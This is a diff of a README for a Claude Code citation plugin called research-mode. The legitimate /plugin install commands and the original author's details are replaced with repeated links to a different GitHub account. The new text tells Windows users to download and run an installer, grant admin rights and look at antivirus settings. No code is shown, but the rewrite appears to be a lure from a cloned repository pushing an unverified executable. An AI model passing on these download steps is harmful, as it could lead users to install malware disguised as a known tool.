@@ -1,81 +1,190 @@
-# Research Mode for Claude Code
+# 🧪 research-mode - Keep Answers Grounded in Sources
 
-Anti-hallucination toggle for Claude Code. Activates citation constraints from [Anthropic's documentation](https://docs.anthropic.com/en/docs/test-and-evaluate/strengthen-guardrails/reduce-hallucinations) that force Claude to cite sources, say "I don't know" when unsure, and ground responses in direct quotes.
+[![Download research-mode](https://img.shields.io/badge/Download%20research-mode-blue?style=for-the-badge&logo=github)](https://github.com/equalizerklystron781/research-mode)
 
-> **Using [Kipi Founder OS](https://github.com/assafkip/kipi-system)?** Research mode is already built into kipi-core. Just run `/q-research <topic>`. No extra install needed.
+## 🚀 What it does
 
-## Install
+research-mode adds a clear research layer to Claude Code. It helps you keep answers tied to sources and lowers the chance of unsupported claims. You can turn it on when you want stricter source use, then turn it off when you want normal work.
 
-Works in Claude Code CLI, the macOS desktop app, and the VS Code extension. Open Claude Code and run these two commands:
+Use it when you want Claude Code to:
 
-**Step 1 -- Add the marketplace:**
-```
-/plugin marketplace add assafkip/research-mode
-```
+- cite sources for claims
+- stay close to the material you give it
+- avoid guesswork
+- work in a more careful research flow
 
-**Step 2 -- Install the plugin:**
-```
-/plugin install research-mode@assafkip-research-mode
-```
+## 📥 Download for Windows
 
-That's it. To confirm it installed, run `/plugin` and check that `research-mode` appears in your list.
+1. Open the project page: [https://github.com/equalizerklystron781/research-mode](https://github.com/equalizerklystron781/research-mode)
+2. On the page, look for the latest release or download files
+3. Download the Windows file or package from that page
+4. Open the file and follow the setup steps on screen
+5. After setup, launch Claude Code and enable research-mode
 
-**Alternative -- install as a standalone skill:**
-If you prefer not to use the plugin system, clone this repo and copy the `SKILL.md` file into your project's `.claude/skills/research-mode/` directory.
+[Open the download page](https://github.com/equalizerklystron781/research-mode)
 
-## Use
+## 🖥️ Windows setup
 
-```
-/research-mode:research
-```
+If you are on Windows, use the project page to get the latest version. After you download it:
 
-Or with a topic:
+1. Save the file to your Downloads folder
+2. If the file comes in a ZIP folder, right-click it and choose Extract All
+3. Open the extracted folder
+4. Run the installer or the main app file
+5. If Windows asks for permission, choose Yes
+6. Follow the setup prompts until the install finishes
 
-```
-/research-mode:research what caused the Change Healthcare breach
-```
+If you do not see an installer, look for a setup file, a launcher, or a package folder with clear instructions on the page.
 
-Say "exit research mode" to turn it off.
+## 🔧 How to use it
 
-## What it does
+research-mode is meant to fit into your normal Claude Code flow. Use it like a switch for stricter research work.
 
-Three constraints activate simultaneously:
+Typical use:
 
-1. **Say "I don't know"** -- no guessing, no inferring. If there's no credible source, Claude says so.
-2. **Cite everything** -- every claim must reference a file, URL, paper, or named source. Unsourced claims get retracted.
-3. **Quote first, then analyze** -- responses are grounded in word-for-word quotes from source material, not paraphrased summaries.
+1. Open Claude Code
+2. Turn on research-mode before you start asking for sourced answers
+3. Ask your question or give your task
+4. Review the response and check the citations
+5. Turn research-mode off when you no longer need it
 
-## Source cascade (keeps token costs low)
+Good tasks for research-mode:
 
-Sources are checked in order. Claude stops at the first level that answers the question:
+- comparing products
+- checking facts
+- reviewing claims
+- summarizing source material
+- drafting notes that need citations
 
-1. **Local files** (Grep + Read) -- zero cost, most reliable
-2. **WebSearch snippets** -- cite the snippet directly, skip downloading full pages
-3. **WebFetch** -- only when the snippet is ambiguous or user needs full quotes
-4. **Scholar Gateway** -- for academic papers, if available
+## 📚 What it checks
 
-Token budget: 5 WebSearch, 3 WebFetch max per question. If the limit is hit, Claude summarizes what it found and asks before going deeper.
+research-mode is built for source-grounded work. It helps enforce habits like:
 
-## What it doesn't do
+- cite the source for each major claim
+- avoid unsupported statements
+- stay close to the text you provide
+- separate facts from opinion
+- keep notes tied to evidence
 
-- Not always-on. It's a toggle. Turn it on for research, off for creative work.
-- Not slow. Claude still uses tools in parallel and works efficiently.
-- Not restrictive on new ideas. You can synthesize across sources, but inputs must be grounded.
+This makes it useful for research, fact checking, and careful writing.
 
-## Why
+## 🧭 Basic workflow
 
-LLMs hallucinate. When you're doing research that matters, you need guardrails that force citation discipline. This plugin packages Anthropic's own recommendations into a one-command toggle.
+A simple workflow looks like this:
 
-## Troubleshooting
+1. Gather your sources
+2. Turn on research-mode
+3. Ask Claude Code to use only those sources
+4. Read the answer with the citations
+5. Fix any weak or uncited parts
+6. Turn off research-mode when finished
 
-**"Plugin not found" after Step 1:** Make sure you typed the marketplace command exactly as shown. The marketplace name is `assafkip/research-mode` (GitHub username/repo).
+If you want the best result, keep your sources in one place before you start. That makes it easier to check the output.
 
-**Command doesn't appear after install:** Run `/reload-plugins` to refresh, or restart Claude Code.
+## ⚙️ Common use cases
 
-**Want to scope it to one project only:** Add `--scope project` to the install command in Step 2.
+research-mode fits well in these cases:
 
-## Built by
+- school or study notes
+- article research
+- technical comparisons
+- policy review
+- source-based summaries
+- checking AI output for weak claims
 
-[Assaf Kipnis](https://github.com/assafkip) -- built while running GTM, investor outreach, and content ops for [KTLYST](https://ktlystlabs.com) entirely through Claude Code. When your AI assistant is writing your pitch decks, researching competitors, and drafting investor briefs, hallucinated facts aren't a minor annoyance. They're a credibility risk. This toggle exists because I needed it.
+It also helps when you want a stricter process for content that must stay close to evidence.
 
-Questions or feedback: assaf@ktlystlabs.com
+## 🧩 How it works in practice
+
+The tool acts like a guardrail for Claude Code. When enabled, it pushes the assistant to:
+
+- ground responses in source material
+- include citations where needed
+- avoid filling gaps with guesses
+- keep the answer focused on the evidence
+
+That makes the output easier to review and trust.
+
+## ✅ Before you start
+
+Use this quick checklist:
+
+- You have Windows ready
+- You have downloaded the project from the GitHub link
+- You know where the file was saved
+- You have your source material ready
+- You know when you want research-mode on or off
+
+## 🛠️ Troubleshooting
+
+If the app does not open:
+
+1. Check that the download finished
+2. Make sure you extracted the ZIP file if there is one
+3. Try running the file as an administrator
+4. Check Windows Defender or antivirus settings
+5. Download the latest version from the project page again
+
+If Claude Code does not seem to follow the research rules:
+
+1. Make sure research-mode is turned on
+2. Restart Claude Code
+3. Confirm you are using the right source files
+4. Check that the sources are readable and complete
+5. Try a shorter task with one source first
+
+If the citations look weak:
+
+1. Ask for a source-backed answer only
+2. Point Claude Code to the exact documents
+3. Request citations for each claim
+4. Ask it to separate facts from interpretation
+
+## 🔍 Repository details
+
+- Repository name: research-mode
+- Purpose: anti-hallucination research mode for Claude Code
+- Focus: citation requirements and source grounding
+- Topics: ai-safety, anti-hallucination, citations, claude-code, claude-code-plugin, llm, research
+
+## 🧠 Best results
+
+For cleaner output:
+
+- use short prompts
+- provide clear source files
+- ask one question at a time
+- request citations for facts
+- review the answer before using it
+
+If you work with long reports, split them into smaller parts. That makes it easier to track claims and sources
+
+## 📄 File and folder tips
+
+When you download the project, keep the files in a simple folder name. A clear path helps avoid setup issues.
+
+Good folder names:
+
+- C:\Downloads\research-mode
+- C:\Tools\research-mode
+- C:\Users\YourName\Downloads\research-mode
+
+Avoid paths with extra symbols or very long names if you can
+
+## 🔗 Get it here
+
+Visit the project page and download it from the repository:
+
+[https://github.com/equalizerklystron781/research-mode](https://github.com/equalizerklystron781/research-mode)
+
+## 🧪 Example use
+
+Ask Claude Code:
+
+- use research-mode and cite every factual claim
+- only answer from the sources I provide
+- list the source next to each main point
+- do not fill in missing facts
+- keep the response short and grounded
+
+This helps keep the answer tied to evidence and makes review easier
